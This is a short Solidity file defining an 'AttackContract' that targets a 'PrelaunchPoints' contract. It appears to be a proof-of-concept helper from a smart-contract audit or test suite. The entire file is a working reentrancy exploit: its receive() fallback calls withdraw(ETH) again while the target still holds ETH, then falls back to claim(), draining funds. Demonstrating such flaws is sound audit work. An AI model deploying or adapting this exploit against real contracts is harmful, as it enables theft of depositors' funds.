// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "../../src/PrelaunchPoints.sol";

contract AttackContract {
    PrelaunchPoints public prelaunchPoints;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes emptydata = new bytes(1);

    constructor(PrelaunchPoints _prelaunchPoints) {
        prelaunchPoints = _prelaunchPoints;
    }

    function attackWithdraw() external {
        prelaunchPoints.withdraw(ETH);
    }

    function attackClaim() external {
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
    }

    receive() external payable {
        if (address(prelaunchPoints).balance > 0) {
            prelaunchPoints.withdraw(ETH);
        } else {
            prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        }
    }
}
